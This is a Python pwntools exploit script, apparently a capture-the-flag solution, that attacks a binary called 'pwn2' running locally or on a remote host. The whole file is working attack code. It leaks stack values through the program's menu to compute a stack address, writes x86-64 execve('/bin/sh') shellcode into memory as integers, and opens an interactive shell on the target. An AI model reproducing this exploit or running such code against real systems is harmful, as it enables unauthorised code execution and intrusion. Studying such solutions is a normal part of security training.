#!/usr/bin/env python

# encoding: utf-8

#__author__='simp1e'

from pwn import *

import struct

import binascii

PROC_NAME='./pwn2'#PORC_NAME

proc_elf=ELF(PROC_NAME)

print proc_elf.checksec()

context.log_level = 'debug'

for i in proc_elf.libs:

    if i.find('libc.so.6')!=-1:

        LOCAL_LIBC_PATH=i

L_LIBC=ELF(LOCAL_LIBC_PATH)



def exp(io,libc):

    ll=log

    ll.debug('get_libc_offset')



    for i in libc.search('/bin/sh'):

        offset_bin_sh=i

        break

    offset_system=libc.symbols['system']

    offset_one_function=libc.symbols['atoi']

    ll.success('offset_system->%s,offset_bin_sh->%s'%(hex(offset_system),hex(offset_bin_sh)))

    io.recv()



    for i in range(36):

        io.sendline('.')

    io.sendline('p')

    io.recvuntil(': ')

    data_h=int(io.recvuntil('\n')[:-1])

    io.sendline('.')

    io.sendline('p')

    io.recvuntil(': ')

    data_l=int(io.recvuntil('\n')[:-1])

    if data_l<0:

        data_l+=0x100000000

    print data_h <<32

    esp=(data_h << 32) +(data_l)-180+4

    print 'esp->%s'%hex(esp)

#-------------back to 24--------------

    #s='.\n'*(0x1000000-12-20)

    for i in range(13):

        io.sendline('w')

    print '--------------stack[1]--------'

    io.sendline(str((esp&0xffffffff)-8))

    io.sendline('+')

    io.sendline(str(data_h))

    io.sendline(str((esp&0xffffffff)+8))

    io.sendline(str(data_h))

#----------shellcode------------

    #shellcode='\xeb\x0b\x5f\x48\x31\xd2\x52\x5e\x6a\x3b\x58\x0f\x05\xe8\xf0\xff\xff\xff\x2f\x2f\x2f\x2f\x62\x69\x6e\x2f\x2f\x2f\x2f\x62\x61\x73\x68'

    shellcode =  ""

    shellcode += "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"

    shellcode += "\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"

    shellcode += "\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68"

    shellcode += "\x00\x56\x57\x48\x89\xe6\x0f\x05"

    i=0

    shellcode += (4-len(shellcode)%4)*'\x90'

    print len(shellcode)



    while i< len(shellcode):

        io.sendline(str(u32(shellcode[i:i+4])))

        i+=4

    for i in range(2+2+len(shellcode)/4):

        io.sendline('.')

    for i in range(34):

        io.sendline('.')

    io.sendline('w')

    io.sendline('q')

    #io.sendline('w')

    io.interactive()

    gdb_code='b *0x400776\n'+'display /gx 0x7fffffffead0\n'

    gdb_code+='display /40gx 0x7fffffffead0-0x100\n'+'b *0x400891\n'

    gdb_code+='b *0x4009a9\n'+'b *0x4009f2\n'

    gdb.attach(proc.pidof(io)[0],gdb_code)

    io.interactive()









if __name__=='__main__':

    print 'Press 1 to test on local\nPress 2 to remote pwn\nPress 3 to test nc on local'

    try:

        choice=int(raw_input('input >').strip('\n'))

    except:

        print 'Press error,Choice default set to 1'

        choice=1

    if choice==1:

        r= process(PROC_NAME)

        exp(r,L_LIBC)

    elif choice==2:

        r= remote('106.75.37.31' ,23333 )

        try:

            R_LIBC=ELF('./remote_libc')

        except:

            R_LIBC=L_LIBC

            print 'Alert! remote libc no found,default set to local libc'

        exp(r,R_LIBC)

    elif choice==3:

        r=remote('127.0.0.1',3333)

        exp(r,L_LIBC)
